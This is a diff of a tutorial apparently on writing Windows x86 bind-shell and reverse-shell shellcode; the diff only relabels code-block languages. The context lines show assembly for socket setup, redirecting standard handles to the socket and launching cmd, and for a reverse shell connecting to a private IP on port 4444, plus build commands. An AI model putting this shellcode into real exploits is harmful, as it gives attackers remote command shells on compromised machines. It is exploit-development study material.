@@ -43,7 +43,7 @@ LoadLibraryA is located at 0x7c801d7b in kernel32.dll
 
 If we continue this process, we have compiled a table of relevant system calls and their addresses:
 
-```
+```perl
 ws2_32.dll:       
   closesocket()           71AB3E2B
   accept()                71AC1040
@@ -80,7 +80,7 @@ We want our first version of the shellcode to work as a standalone executable to
 Documentation: <a href="https://docs.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-loadlibrarya">https://docs.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-loadlibrarya</a>
 
 Syntax:
-```
+```perl
 LoadLibraryA(_In_ LPCTSTR lpFileName)
 ```
 
@@ -100,13 +100,13 @@ A trick was used here to insert null bytes to terminate the "ws2_32" string, wit
 The `mov ax, 0x3233` operation stores the string "32" in the lowest 16 bits of EAX. The highest 16 bits are filled with 0x00 (due to the previous `xor eax, eax` operation). This will nicely terminate the string without us needing to hardcode a null byte in the code. If we would have done the following instead, it would have broken the shellcode:
 
 Assembly:
-```assembly
+```nasm
 push 0x00003233 "32\0\0"
 push 0x5f327377 "ws2_"
 ```
 
 Notice the nulls in pure hex bytes:
-```
+```nasm
 6833320000687773325F
 ```
 
@@ -127,13 +127,13 @@ Documentation: <a href="https://docs.microsoft.com/en-us/windows/win32/api/winso
 Documentation: <a href="https://docs.microsoft.com/en-us/windows/win32/api/winsock/ns-winsock-wsadata">https://docs.microsoft.com/en-us/windows/win32/api/winsock/ns-winsock-wsadata</a>
 
 Syntax:
-```
+```nasm
 WSAStartup(WORD wVersionRequired, LPWSADATA lpWSAData)
 ```
 
 The next system call we need to run is WSAStartup() to initialize the use of sockets. It takes two arguments, where the first is the version we are going to use and the second is a pointer to a place to store socket data.
 
-```assembly
+```nasm
 add esp, 0xFFFFFE70 ; Creating space for WSAData (400 bytes)
 push esp            ; Arg2 (lpWSAData) = pointer to WSData
 push 0x101          ; Arg1 (wVersionRequired) = 1.1
@@ -142,7 +142,7 @@ call eax
 ```
 
 The first instruction is `add esp, 0xFFFFFE70`, which is a way of creating space on the stack without generating null bytes. The normal way of achieving this would be to subtract a value from ESP (remember the stack grows downwards). However, this results in null bytes:
-```
+```nasm
 nasm > sub esp, 0x190
 00000000  81EC90010000      sub esp,0x190
 ```
@@ -155,13 +155,13 @@ I'm not sure why this trick works, but by inverting the logic it works in our fa
 Documnetation: <a href="https://docs.microsoft.com/en-us/windows/win32/api/winsock2/nf-winsock2-wsasocketa">https://docs.microsoft.com/en-us/windows/win32/api/winsock2/nf-winsock2-wsasocketa</a>
 
 Syntax:
-```
+```nasm
 WSASocketA(int af, int type, int protocol, LPWSAPROTOCOL_INFOA lpProtocolInfo, GROUP g, DWORD dwFlags)
 ```
 
 Now we need to create a socket. This function takes a few parameters, like information about the socket type. 
 
-```assembly
+```nasm
 xor eax, eax         ; Clear eax
 push eax             ; Arg6 (dwFlags) = 0
 push eax             ; Arg5 (g) = 0
@@ -182,7 +182,7 @@ Documentation: <a href="https://docs.microsoft.com/en-us/windows/win32/api/winso
 Documnetation: <a href="https://docs.microsoft.com/en-us/windows/win32/winsock/sockaddr-2">https://docs.microsoft.com/en-us/windows/win32/winsock/sockaddr-2</a>
 
 Syntax:
-```
+```nasm
 bind(SOCKET s, const sockaddr *addr, int namelen)
 ```
 
@@ -225,7 +225,7 @@ server.sin_port = htons(4444);         # 0x5c11
 ```
 
 What we need to do is to have a pointer to the following values and pass it as the second argument:
-```
+```nasm
 5c110002
 00000000
 ```
@@ -238,7 +238,7 @@ Explanation:
 + al = 0x02 (lowest 8 bits of ax) 
 + ah = 0x01 (highest 8 bits of ax)  
 
-```assembly
+```nasm
 xor eax, eax         ; Clear eax
 push eax             ; Push 0 on the stack to define INADDR_ANY.
 mov eax, 0x5c110102 
@@ -269,13 +269,13 @@ The stack looks like this right before calling bind():
 Documentation: <a href="https://docs.microsoft.com/en-us/windows/win32/api/winsock2/nf-winsock2-listen">https://docs.microsoft.com/en-us/windows/win32/api/winsock2/nf-winsock2-listen</a>
 
 Syntax:
-```
+```nasm
 listen(SOCKET s, int backlog)
 ```
 
 To get incoming connections, we need to call the listen() function, which is very simple to implement.
 
-```assembly
+```nasm
 push 0x1             ; Arg2 (backlog) = 1         
 push ebx             ; Arg1 (s) = WSASocket() handler
 mov eax, 0x71AB8CD3  ; Address to listen()   
@@ -287,13 +287,13 @@ call eax
 Documentation: <a href="https://docs.microsoft.com/en-us/windows/win32/api/winsock2/nf-winsock2-accept">https://docs.microsoft.com/en-us/windows/win32/api/winsock2/nf-winsock2-accept</a>
 
 Syntax:
-```
+```nasm
 accept(SOCKET s, sockaddr *addr, int *addrlen)
 ```
 
 As the docs says, "The accept function permits an incoming connection attempt on a socket". We need to store the return value here, which gets stored in EAX. We store a copy in EBX for later use.
 
-```assembly
+```nasm
 xor eax, eax         ; Clear eax
 push eax             ; Arg3 (addrlen) = 0
 push eax             ; Arg2 (*addr) = 0
@@ -310,13 +310,13 @@ Now finally we have the socket up and running. Time to implement the shell part.
 Docs: <a href="https://docs.microsoft.com/en-us/windows/console/setstdhandle">https://docs.microsoft.com/en-us/windows/console/setstdhandle</a>
 
 Syntax:
-```
+```nasm
 SetStdHandle(_In_ DWORD nStdHandle, _In_ HANDLE hHandle)
 ```
 
 We will call this function three times to set STD_INPUT, STD_OUTPUT and STD_ERROR to the accepted socket connection.
 
-```assembly
+```nasm
 mov edx, 0x7c81d363  ; Address to SetStdHandle()
 
 push ebx             ; Arg2 (hHandle) = accept() handler
@@ -337,13 +337,13 @@ call edx
 Documentation: <a href="https://docs.microsoft.com/en-us/cpp/c-runtime-library/reference/system-wsystem?view=vs-2019">https://docs.microsoft.com/en-us/cpp/c-runtime-library/reference/system-wsystem?view=vs-2019</a>
 
 Syntax:
-```
+```nasm
 system(const char *command)
 ```
 
 The final system call we need to call is the actual execution of OS commands. It takes one argument which is the a pointer to a command string. If you remember earlier, we had to deal with a filename string needed to be terminated with a null byte. Here we will also do some maneuvering to mitigate null bytes in the code.
 
-```assembly
+```nasm
 mov DWORD [esp-0x5], 0x646d6341   ; Store string "Acmd" 5 bytes from top of stack
 lea eax, [esp-0x4]                ; Store pointer to the string "cmd\0" in eax
 lea esp, [esp-0x4]                ; Manually update esp
@@ -407,7 +407,7 @@ Below is an alternative version of system(), which saves some bytes using EBP in
 We save space because we don't need to update the value of EBP, like we did to ESP in the previous example.
 The reason I use ESP instead is that EBP might get overwritten by the exploit.
 
-```assembly
+```nasm
 mov DWORD [ebp-0x5], 0x646d6341
 lea eax, [ebp-0x4]
 push eax
@@ -418,7 +418,7 @@ call eax
 
 ### The complete bind shell code
 
-```assembly
+```nasm
 [BITS 32]
 
 global _start
@@ -517,13 +517,13 @@ Time to compile this thing. This can be done on Windows by downloading the follo
 + <a href="http://mingw.org/category/wiki/download">ld.exe</a>
 + <a href="https://www.nasm.us/pub/nasm/releasebuilds/">nasm.exe</a>
 
-```
+```nasm
 > nasm.exe -f win32 -o bind.obj bind.asm
 > ld.exe bind.obj -o bind.exe
 ```
 
 Or you can cross-compile this on a Linux box:
-```
+```nasm
 $ nasm -f win32 bind.asm -o bind.o
 $ ld -m i386pe bind.o -o bind.exe
 ```
@@ -568,13 +568,13 @@ For the reverse shell, we will reuse a lot from the bind shell code. In fact, we
 Documentation: <a href="https://docs.microsoft.com/en-us/windows/win32/api/winsock2/nf-winsock2-connect">https://docs.microsoft.com/en-us/windows/win32/api/winsock2/nf-winsock2-connect</a>
 
 Syntax:
-```
+```nasm
 connect(SOCKET s, const sockaddr *name, int namelen)
 ```
 
 The connect system call connects to a socket. It takes three arguments and looks more or less like bind().
 
-```assembly
+```nasm
 push 0x8201A8C0      ; Remote IP address, 192.168.1.130   
 mov eax, 0x5c110102  ; Port nr, 4444 (first 2 bytes) 
 dec ah               ; eax: 0x5c110102 -> 0x5c110002 (Mitigating null byte)
@@ -590,7 +590,7 @@ call eax
 ```
 
 The logic for the remote IP address is the following:
-```
+```nasm
 82 = 130
 01 = 1
 A8 = 168
